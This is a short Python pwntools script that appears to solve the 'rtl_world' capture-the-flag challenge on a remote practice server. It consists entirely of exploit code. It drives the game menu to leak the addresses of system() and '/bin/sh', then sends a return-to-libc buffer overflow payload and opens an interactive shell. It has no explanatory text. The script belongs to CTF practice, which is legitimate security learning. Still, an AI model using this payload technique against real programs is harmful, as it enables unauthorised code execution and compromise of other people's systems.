#!/usr/bin/python 
from pwn import * 

context.log_level = 'debug' 
#p = process("./rtl_world") 
p = remote("ctf.j0n9hyun.xyz", 3010) 
def gold(): 
    p.sendlineafter(">>> ", '2') 
    p.sendlineafter("(Job)>>> ", '3') 

gold() 
gold() 

p.sendlineafter(">>> ", '3') 
p.recvuntil("System Armor : ") 
system = int(p.recv(10), 16) 
log.info("system addr : "+hex(system)) 

for i in range(6): 
    gold() 

p.sendlineafter(">>> ", '4') 
p.recvuntil("Shell Sword : ") 
binsh = int(p.recv(10), 16) 
log.info("binsh addr : "+hex(binsh)) 

p.sendlineafter(">>> ", '5') 
pay = 'A'*0x8c + 'B'*4 + p32(system) + 'C'*4 + p32(binsh) 
p.sendlineafter("[Attack] > ", pay) 

p.interactive()

